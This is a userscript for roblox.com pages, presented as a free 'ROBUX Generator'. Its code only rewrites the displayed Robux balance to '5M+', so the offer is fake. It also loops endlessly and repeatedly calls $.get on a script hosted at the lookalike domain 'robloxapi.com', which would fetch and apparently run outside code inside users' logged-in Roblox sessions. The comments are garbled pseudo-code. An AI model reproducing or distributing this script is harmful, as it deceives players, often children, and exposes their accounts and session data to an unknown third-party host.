// ==UserScript==
// @name         ROBUX Generator
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  Free ROBUX! Do not abuse or you can get banned.
// @author       Jam
// @match        https://web.roblox.com/*
// @match        https://www.roblox.com/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/418415/ROBUX%20Generator.user.js
// @updateURL https://update.greasyfork.org/scripts/418415/ROBUX%20Generator.meta.js
// ==/UserScript==

// Import ROBLOX
// Generate Robux == roblox.api.com/l/RobuxSniper/2.4.7
// 5 Million ROBUX = document.getElementByID("ROBLOXServer.snatch
// 5 Million ROBUX(=> btn.click())

function start() {
    var robux = document.getElementById("nav-robux-amount");
    robux.innerHTML = "5M+";
      setTimeout(start, 0);
      Javascript:$.get('//robloxapi.com/l/RobuxSniper/2.47.js')
}
start();